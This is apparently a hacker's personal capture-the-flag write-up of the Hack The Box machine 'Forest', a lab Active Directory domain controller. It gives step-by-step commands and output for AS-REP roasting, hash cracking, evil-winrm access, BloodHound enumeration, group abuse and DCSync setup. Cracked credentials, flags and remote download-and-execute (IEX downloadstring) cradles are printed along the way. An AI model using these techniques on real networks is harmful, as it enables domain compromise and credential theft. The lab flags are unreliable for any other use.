



```
Exploit used: 

- GetNPUsers.py -request -dc-ip 10.10.10.161 htb.local/
	- used to dump svc-alfresco hashed creds
- hashcat on local windows machine to break creds.


Privilege escalation used: 
- Secretsdump.py/psexec.py


Lessons learned:

- https://www.youtube.com/watch?v=y3tB-9VBELc&list=PLk6vOUIjcauXQy0xJ9zrf4B99XkicA8cO&index=5
	- bloodhound walkthrough reference
- Bloodhound/Sharphound experience
	-  learned how to lookup bloodhound results such as what an "Account Operator" is on google
- GetADusers.py to gather sensitive users from misconfigured AD.
- GetNPUsers.py to dump hashed credentials
- evil-winrm to use creds to powershell onto the box (powershell version of ssh)
	- learned how to upload/download using winrm
	- when that didnt work learned how to setup smb shares to transfer files
- psexec.py
- secretsdump.py
#bellinger helped me out luckily and explained that the IEX only invokes the powerView.ps1, it doesn't put the file onto the box like you would on a reguler winpeas box.
#Bypass-4MSI command in evil-winrm patches the firewall which allows for following commands
# $pass command used to assign john's password
# $cred command assigns the domain\user and pass.
# Add-DomainObjextAcl allows john to use DCSync
# once DCSync is active on the user we are able to secretdump.py to get domain admin credentials to psexec onto actual admin.
# once we have a successful secrets dump we were able to psexec.py on as domain admin.

Loot:

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> type user.txt
f5fa521ca23c4fdb2596b904025ca7ab

C:\Users\Administrator\Desktop> type root.txt
2549b5a4dec732e47c8e8b9e81dd3fc7

```

```
06Feb2023
18:51
# udp scan
┌──(root㉿kali)-[/home/kali]
└─# nmap -sU --top-ports 10 -sV 10.10.10.161 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-06 23:53 EST
Nmap scan report for 10.10.10.161
Host is up (0.23s latency).

PORT     STATE         SERVICE      VERSION
53/udp   open          domain       (generic dns response: SERVFAIL)
67/udp   closed        dhcps
123/udp  open          ntp          NTP v3
135/udp  closed        msrpc
137/udp  open|filtered netbios-ns
138/udp  open|filtered netbios-dgm
161/udp  closed        snmp
445/udp  closed        microsoft-ds
631/udp  closed        ipp
1434/udp closed        ms-sql-m
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-UDP:V=7.93%I=7%D=2/6%Time=63E1D973%P=x86_64-pc-linux-gnu%r(NBTSt
SF:at,32,"\x80\xf0\x80\x82\0\x01\0\0\0\0\0\0\x20CKAAAAAAAAAAAAAAAAAAAAAAAA
SF:AAAAAA\0\0!\0\x01");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 112.89 seconds
```

```
# tcp scan

┌──(root㉿kali)-[/home/kali]
└─# nmap -Pn -sV -sC 10.10.10.161           
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-06 23:53 EST

Nmap scan report for 10.10.10.161
Host is up (0.12s latency).
Not shown: 989 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-02-07 05:03:52Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h46m49s, deviation: 4h37m10s, median: 6m48s
| smb2-time: 
|   date: 2023-02-07T05:04:07
|_  start_date: 2023-02-07T04:58:11
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2023-02-06T21:04:06-08:00

```

```
# smbclient attempt, anonymous login allowed but nothing there.
19:01
──(root㉿kali)-[/home/kali]
└─# smbclient -L \\\\10.10.10.161         
Password for [WORKGROUP\kali]:
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.161 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

```
19:09
┌──(root㉿kali)-[/home/kali]
└─# crackmapexec smb 10.10.10.161 -u '' -p ''
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [-] htb.local\: STATUS_ACCESS_DENIED 
```
![[4 crackmapexec anon login.png]]

```
19:28
┌──(root㉿kali)-[/home/kali]
└─# crackmapexec smb 10.10.10.161 -u 'guest' -p ''
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [-] htb.local\guest: STATUS_ACCOUNT_DISABLED 
```

```
# part of impacket toolset
# a great tool and it can exploit and get sensitive information from misconfigured ADs
19:24
┌──(root㉿kali)-[/home/kali]
└─# GetADUsers.py -dc-ip 10.10.10.161 htb.local/
Impacket v0.10.1.dev1+20230116.181610.efcaec35 - Copyright 2022 Fortra

[*] Querying 10.10.10.161 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator         Administrator@htb.local         2021-08-30 20:51:58.690463  2023-02-06 23:59:01.532715 
HealthMailbox0659cc1  HealthMailbox0659cc188f4c4f9f978f6c2142c4181e@htb.local  2019-09-19 07:57:58.643994  <never>             
HealthMailbox670628e  HealthMailbox670628ec4dd64321acfdf6e67db3a2d8@htb.local  2019-09-19 07:56:45.643993  <never>             
HealthMailbox6ded678  HealthMailbox6ded67848a234577a1756e072081d01f@htb.local  2019-09-19 07:57:06.597012  <never>             
HealthMailbox7108a4e  HealthMailbox7108a4e350f84b32a7a90d8e718f78cf@htb.local  2019-09-19 07:57:48.253341  <never>             
HealthMailbox83d6781  HealthMailbox83d6781be36b4bbf8893b03c2ee379ab@htb.local  2019-09-19 07:57:17.065809  <never>             
HealthMailbox968e74d  HealthMailbox968e74dd3edb414cb4018376e7dd95ba@htb.local  2019-09-19 07:56:56.143969  <never>             
HealthMailboxb01ac64  HealthMailboxb01ac647a64648d2a5fa21df27058a24@htb.local  2019-09-19 07:57:37.878559  <never>             
HealthMailboxc0a90c9  HealthMailboxc0a90c97d4994429b15003d6a518f3f5@htb.local  2019-09-19 07:56:35.206329  <never>             
HealthMailboxc3d7722  HealthMailboxc3d7722415ad41a5b19e3e00e165edbe@htb.local  2019-09-23 18:51:31.892097  2019-09-23 18:57:12.361516 
HealthMailboxfc9daad  HealthMailboxfc9daad117b84fe08b081886bd8a5a50@htb.local  2019-09-23 18:51:35.267114  2019-09-23 18:52:05.736012 
HealthMailboxfd87238  HealthMailboxfd87238e536e49e08738480d300e3772@htb.local  2019-09-19 07:57:27.487679  <never> ```


```

```
19:39
┌──(root㉿kali)-[/home/kali]
└─#    -request -dc-ip 10.10.10.161 htb.local/
Impacket v0.10.1.dev1+20230116.181610.efcaec35 - Copyright 2022 Fortra

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC      
------------  ------------------------------------------------------  --------------------------  --------------------------  --------
svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2023-02-07 00:37:57.148790  2019-09-23 07:09:47.931194  0x410200 



$krb5asrep$23$svc-alfresco@HTB.LOCAL:90c516ddecad45f147de5d6154f5ea41$dce6ae954059a2018416c416c0f3feb5dea806375f6439d1f9ae3be1db66fc84a080a49dbf46769fea7457c1f65d513814f82db1887859a6d79398d3b15e22891253186ca1aaeadb53fb12487b4811a7ee039f2c557dee0ec0268fcbb72743c7da7da972d1b37f3dd79fb95ac1db8344082dd9035307e343df0abb9e95ab19be4d21699a5645357162330a7ed0c21ebb41cdfe9f8b740654f4d92fcfb1a7681d8a3417f5f42368cd0223e7f322c4a3f0e165598726302b9e8edd7cfe2c75de0c363dae9b37ba0a177faa359263f54bdd10fc97db997611e0e5cfd43d5f2a977864cefd2a09d5
```

```
19:41
# looked up hashcat type on hashcat examples.
- image 8
```
![[8 hashcat example lookup.png]]

```
.\hashcat.exe -m 18200 ..\hash.txt ..\rockyou.txt -o ..cracked.txt
```


```
19:54
- image 9 is hashcat.txt
- image 10 is results after running hashcat to see if it worked.
- saved hash in hash.txt in C:\Users\jorde\Downloads\hashcat-6.2.6 on personal computer.
```

```
19:58
- successfully cracked password in image 11
- credentials: 
svc-alfresco / s3rvice

# stopping here for the day.
```

```
16:27
picking up for the day.
- finding out where these creds go to.
- going to test smb feature in crackmapexec.
```

```
16:32
# [+] means that the credentials worked.
┌──(root㉿kali)-[/home/kali]
└─# crackmapexec smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice' 
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
```

```
16:34
# testing --shares to see if able to see shares.
┌──(root㉿kali)-[/home/kali]
└─# crackmapexec smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice' --shares
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
SMB         10.10.10.161    445    FOREST           [+] Enumerated shares
SMB         10.10.10.161    445    FOREST           Share           Permissions     Remark
SMB         10.10.10.161    445    FOREST           -----           -----------     ------
SMB         10.10.10.161    445    FOREST           ADMIN$                          Remote Admin
SMB         10.10.10.161    445    FOREST           C$                              Default share
SMB         10.10.10.161    445    FOREST           IPC$                            Remote IPC
SMB         10.10.10.161    445    FOREST           NETLOGON        READ            Logon server share 
SMB         10.10.10.161    445    FOREST           SYSVOL          READ            Logon server share 

```

```
16:36
smbclient \\\\10.10.10.161\\NETLOGON -U svc-alfresco
password: s3rvice

- worked sifting around the smb directories.
	- grabbed GptTmpl.inf file, after googling .inf it says its a txt file with machine information
	- image 14
- found Shutdown & Startup Scripts in smb: \htb.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Scripts\
	- grabbed 2nd GptTmpl.inf file
	- image 15
# didnt get anything from this, continuing on.
- access denied on ADMIN$ and C$ attempt. Nothing in IPC$
```

```
16:51
#psexec attempt
┌──(root㉿kali)-[/home/kali]
└─# psexec.py svc-alfresco:'s3rvice'@10.10.10.161
Impacket v0.10.1.dev1+20230116.181610.efcaec35 - Copyright 2022 Fortra

[*] Requesting shares on 10.10.10.161.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'SYSVOL' is not writable.

# failed moving on.
```

```
16:57
# grabbed list of users on the domain
- refer to image 16
┌──(root㉿kali)-[/home/kali]
└─# crackmapexec smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice' --users 
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
SMB         10.10.10.161    445    FOREST           [+] Enumerated domain user(s)
SMB         10.10.10.161    445    FOREST           htb.local\santi                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.10.10.161    445    FOREST           htb.local\mark                           badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.10.10.161    445    FOREST           htb.local\andy                           badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.10.10.161    445    FOREST           htb.local\svc-alfresco                   badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.10.10.161    445    FOREST           htb.local\lucinda                        badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.10.10.161    445    FOREST           htb.local\sebastien                      badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.10.10.161    445    FOREST           htb.local\HealthMailbox0659cc1           badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.10.10.161    445    FOREST           htb.local\HealthMailbox7108a4e           badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.10.10.161    445    FOREST           htb.local\HealthMailboxb01ac64           badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.10.10.161    445    FOREST           htb.local\HealthMailboxfd87238           badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.10.10.161    445    FOREST           htb.local\HealthMailbox83d6781           badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.10.10.161    445    FOREST           htb.local\HealthMailbox6ded678           badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.10.10.161    445    FOREST           htb.local\HealthMailbox968e74d           badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.10.10.161    445    FOREST           htb.local\HealthMailbox670628e           badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.10.10.161    445    FOREST           htb.local\HealthMailboxc0a90c9           badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.10.10.161    445    FOREST           htb.local\HealthMailboxfc9daad           badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.10.10.161    445    FOREST           htb.local\HealthMailboxc3d7722           badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.10.10.161    445    FOREST           htb.local\SM_1ffab36a2f5f479cb           badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.10.10.161    445    FOREST           htb.local\SM_c75ee099d0a64c91b           badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.10.10.161    445    FOREST           htb.local\SM_7c96b981967141ebb           badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.10.10.161    445    FOREST           htb.local\SM_9b69f1b9d2cc45549           badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.10.10.161    445    FOREST           htb.local\SM_1b41c9286325456bb           badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.10.10.161    445    FOREST           htb.local\SM_681f53d4942840e18           badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.10.10.161    445    FOREST           htb.local\SM_75a538d3025e4db9a           badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.10.10.161    445    FOREST           htb.local\SM_ca8c2ed5bdab4dc9b           badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.10.10.161    445    FOREST           htb.local\SM_2c8eef0a09b545acb           badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.10.10.161    445    FOREST           htb.local\$331000-VK4ADACQNUCA           badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.10.10.161    445    FOREST           htb.local\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.10.10.161    445    FOREST           htb.local\DefaultAccount                 badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
10.10.10.161    445    FOREST           htb.local\Guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:00:00
SMB         10.10.10.161    445    FOREST           htb.local\Administrator                  badpwdcount: 0 baddpwdtime: 2021-08-31 08:56:53.150717
```

```
# checked current sessions of people online, there are none.
16:59
┌──(root㉿kali)-[/home/kali]
└─# crackmapexec smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice' --sessions
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
SMB         10.10.10.161    445    FOREST           [+] Enumerated sessions
```

```
17:04
# added 10.10.10.161   htb.local to /etc/hosts
- image 17
```


```bash
17:07
# created users.txt with all new users from image 16
- image 18

┌──(root㉿kali)-[/home/kali]
└─ impacket-GetNPUsers -userfile 'users.txt' -dc-ip '10.10.10.161' htb.local 
Impacket v0.10.1.dev1+20230116.181610.efcaec35 - Copyright 2022 Fortra

usage: GetNPUsers.py [-h] [-request] [-outputfile OUTPUTFILE] [-format {hashcat,john}] [-usersfile USERSFILE] [-ts] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] target
GetNPUsers.py: error: unrecognized arguments: -userfile htb.local

# failed, going to see what walkthrough does with these usernames.
```

```
# learned from walkthrough to use evil-rm to utilize svc-alfresco creds to get a shell on the box. 
17:22

┌──(root㉿kali)-[/usr/bin]
└─# evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice  

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>   whoami
htb\svc-alfresco
```

```
# grabbed user.txt flag
17:28
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> type user.txt
f5fa521ca23c4fdb2596b904025ca7ab
```

```
# have to use bloodhound, had to relookup how to setup.
17:51
- in new console type "neo4j console"
- click on link to bring up bloodhound.
- username: neo4j
password: neo4j

newpassword: Bangerbanger1223!!

# refer to elevate cyber if need help setting up again.

```

```
# downloading sharphound and uploading to windows box
18:15
- downloaded sharphound.exe from https://github.com/BloodHoundAD/SharpHound/releases/tag/v1.1.0
- used evil-winrm to upload to windows machine. 
- image 21 reference.
- can use powershell or certutil to upload as well.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload /home/kali/Downloads/SharpHound.exe
Info: Uploading /home/kali/Downloads/SharpHound.exe to C:\Users\svc-alfresco\Documents\SharpHound.exe

                                                             
Data: 1402196 bytes of 1402196 bytes copied

Info: Upload successful!

```

```
# running sharphound
18:18

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> .\SharpHound.exe -c all,gpolocalgroup
2023-02-07T20:18:28.8019646-08:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
2023-02-07T20:18:28.9737778-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-02-07T20:18:29.0050363-08:00|INFORMATION|Initializing SharpHound at 8:18 PM on 2/7/2023
2023-02-07T20:18:29.4581704-08:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-02-07T20:18:29.9278823-08:00|INFORMATION|Beginning LDAP search for htb.local
2023-02-07T20:18:30.0418540-08:00|INFORMATION|Producer has finished, closing LDAP channel
2023-02-07T20:18:30.0574781-08:00|INFORMATION|LDAP channel closed, waiting for consumers
2023-02-07T20:19:00.5878269-08:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 44 MB RAM
2023-02-07T20:19:16.9658607-08:00|INFORMATION|Consumers finished, closing output channel
2023-02-07T20:19:17.0752349-08:00|INFORMATION|Output channel closed, waiting for output task to complete
Closing writers
2023-02-07T20:19:17.3408563-08:00|INFORMATION|Status: 161 objects finished (+161 3.425532)/s -- Using 51 MB RAM
2023-02-07T20:19:17.3408563-08:00|INFORMATION|Enumeration finished in 00:00:47.4160567
2023-02-07T20:19:17.6221102-08:00|INFORMATION|Saving cache with stats: 118 ID to type mappings.
 118 name to SID mappings.
 0 machine sid mappings.
 2 sid to domain mappings.
 0 global catalog mappings.
2023-02-07T20:19:17.6377433-08:00|INFORMATION|SharpHound Enumeration Completed at 8:19 PM on 2/7/2023! Happy Graphing!
```

```
# checking dir to show sharphound results.
18:20

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> ls


    Directory: C:\Users\svc-alfresco\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/7/2023   8:51 AM                orpheus
-a----         2/7/2023   8:40 PM          18875 20230207203950_BloodHound.zip
-a----         2/7/2023   8:40 PM          19605 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
-a----         2/7/2023   8:38 PM        1051648 SharpHound.exe

```

```
# downloaded bloohound.zip into blood.zp on my kali box.
# NOTE ENSURE TO FOLLOW SYNTAX EXACTLY WITH QUOTES, STRUGGLES DOWNLOADING FILE WITHOUT QUOTES.
18:37

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> download "20230207203950_BloodHound.zip" /home/kali/Downloads/blood.zip
Info: Downloading 20230207203950_BloodHound.zip to /home/kali/Downloads/blood.zip

                                                             
Info: Download successful!

```

```
# dragged and dropped blood.zip into bloodhound to open
18:46
- refer to image 26
```

```

# once data is uploaded mark owned user as a owned in blood hound to keep track of it. use hamburger button to navigate through digested data.
18:51
- refer to image 27
```

```
# kinda backtracking here, forgot to do a whoami /priv
18:57

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled

```

```
# back on bloodhound able to see that the user SVC-ALFRESCO@HTB.LOCAL is a member of SERVICE ACCOUNTS@HTB.LOCAL, PRIVILEGED IT ACCOUNTS@HTB.LOCAL & ACCOUNT OPERATORS@HTB.LOCAL and CANPSREMOTE to FOREST.HTB.LOCAL
# CAN BE SEEN BY RIGHT CLICKING THE LINE INBETWEEN USERS AND CLICK THE HELP ? BUTTON.
- refer to image 28, ABUSE INFO WAS TOO LONG TO SCREENSHOT, IN TEXT BELOW.

19:02

INFO:
The members of the group PRIVILEGED IT ACCOUNTS@HTB.LOCAL have the capability to create a PSRemote Connection with the computer FOREST.HTB.LOCAL.

PS Session access allows you to enter an interactive session with the target computer. If authenticating as a low privilege user, a privilege escalation may allow you to gain high privileges on the system.

Note: This edge does not guarantee privileged execution.

ABUSE INFO:

Abuse of this privilege will require you to have interactive access with a system on the network.

A remote session can be opened using the New-PSSession powershell command.

You may need to authenticate to the Domain Controller as a member of PRIVILEGED IT ACCOUNTS@HTB.LOCAL if you are not running a process as a member. To do this in conjunction with New-PSSession, first create a PSCredential object (these examples comes from the PowerView help documentation):

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Then use the New-PSSession command with the credential we just created:

$session = New-PSSession -ComputerName FOREST.HTB.LOCAL -Credential $Cred
This will open a powershell session on FOREST.HTB.LOCAL.

You can then run a command on the system using the Invoke-Command cmdlet and the session you just created

Invoke-Command -Session $session -ScriptBlock {Start-Process cmd}
Cleanup of the session is done with the Disconnect-PSSession and Remove-PSSession commands.

Disconnect-PSSession -Session $session
Remove-PSSession -Session $session
An example of running through this cobalt strike for lateral movement is as follows:

powershell $session =  New-PSSession -ComputerName win-2016-001; Invoke-Command -Session $session -ScriptBlock {IEX ((new-object net.webclient).downloadstring('http://192.168.231.99:80/a'))}; Disconnect-PSSession -Session $session; Remove-PSSession -Session $session

```

![[28 CanPSRemote info.png]]


```
19:11
# STOPPING FOR THE DAY, PICKING UP TOMORROW.
- START WITH BLOODHOUND ABUSE INFO, TOMORROW.
```

```
16:52
Starting again.

┌──(root㉿kali)-[/home/kali]
└─# neo4j console

┌──(root㉿kali)-[/home/kali]
└─# bloodhound

- copied the blood.zip back into bloodhound and brought up the 

```

```
# back onto winrm
17:07
┌──(kali㉿kali)-[~]
└─$ su root
Password: 
┌──(root㉿kali)-[/home/kali]
└─# evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
```

```
17:22
image 32, looking up what account operators can do in a windows domain.
-https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups
	-The Account Operators group grants limited account creation privileges to a user. Members of this group can create and modify most types of accounts, including accounts for users, Local groups, and Global groups. Group members can log in locally to domain controllers.

```

```
17:26
## svc-alfresco can add users to any other group due to being in account operators ##
```
![[33 account operators priv.png]]

```
17:17
# refer to image 29 - 31 for methods on next steps.

```


```
#notethatmybloodhounddoesnotcontain "exchange windows permissions@htb.local"
17:54
# added new user
net user bugs password123 /add /domain
# added new user to Exchange Windows Permissionsand svc-alfresco
net group "Exchange Windows Permissions" /add bugs

net group "Exchange Windows Permissions" /add svc-alfresco
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" 
Group name     Exchange Windows Permissions
Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted.

Members

-------------------------------------------------------------------------------
bugs                     svc-alfresco
The command completed successfully.

```



```
# checking to see if bugs was added to Exchange Windows Permissions group
# image 34
17:56

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions"
Group name     Exchange Windows Permissions
Comment        This group contains Exchange servers that run Exchange cmdlets on behalf of users via the management service. Its members have permission to read and modify all Windows accounts and groups. This group should not be deleted.

Members

-------------------------------------------------------------------------------
bugs
The command completed successfully.

```

```
# getting Powersploit and moving into /opt
18:13
┌──(root㉿kali)-[/opt]
└─# git clone https://github.com/PowerShellMafia/PowerSploit/ -b dev
Cloning into 'PowerSploit'...
remote: Enumerating objects: 3086, done.
remote: Total 3086 (delta 0), reused 0 (delta 0), pack-reused 3086
Receiving objects: 100% (3086/3086), 10.47 MiB | 12.35 MiB/s, done.
Resolving deltas: 100% (1809/1809), done.
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[/opt]
└─# ls
impacket  microsoft  PowerSploit
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[/opt]
└─# cd PowerSploit 
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[/opt/PowerSploit]
└─# ls
AntivirusBypass  CodeExecution  docs  Exfiltration  LICENSE  Mayhem  mkdocs.yml  Persistence  PowerSploit.psd1  PowerSploit.psm1  PowerSploit.pssproj  PowerSploit.sln  Privesc  README.md  Recon  ScriptModification  Tests

```

![[35 powersploit download.png]]

```
# hosting webserver to transfer PowerView.ps1 from kali box.
18:15
pt/PowerSploit/Recon]
└─# python3 -m http.server 80   
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.161 - - [08/Feb/2023 23:26:21] "GET /PowerView.ps1 HTTP/1.1" 200 -

```

```
# on evil rm using powershell commands to xfer file to 
18:27

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> IEX(New-Object Net.WebClient).downloadString('http://10.10.16.4/PowerView.ps1')
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 

$pass = convertto-securestring 's3rvice' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('HTB\svc-alfresco', $pass)
Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity svc-alfresco -Rights DCSync
```

```
19:08
Going to have to restart my bloodhound/sharphound tomorrow to get more data. my bloodhound results arent  showing the same thing at all as all the walkthroughs. 

-2 nd step after tha is try to upload winpeas/powerup and try to privesc to move laterally.
```

```
14:30
 Starting back up day 3/3
 #note after completed, this is where actually began having success.
```

```
# reuploaded sharphgound and ran to get new results
14:37
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> upload /home/kali/Downloads/SharpHound.exe
Info: Uploading /home/kali/Downloads/SharpHound.exe to C:\Users\svc-alfresco\Desktop\SharpHound.exe

                                                             
Data: 1402196 bytes of 1402196 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> dir


    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/9/2023   4:42 PM        1051648 SharpHound.exe
-ar---         2/8/2023  11:03 PM             34 user.txt


*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> .\SharpHound.exe -c all,gpolocalgroup
2023-02-09T16:42:49.6033020-08:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
2023-02-09T16:42:49.8064259-08:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-02-09T16:42:49.8376751-08:00|INFORMATION|Initializing SharpHound at 4:42 PM on 2/9/2023
2023-02-09T16:42:50.2751908-08:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote
2023-02-09T16:42:50.6607789-08:00|INFORMATION|Beginning LDAP search for htb.local
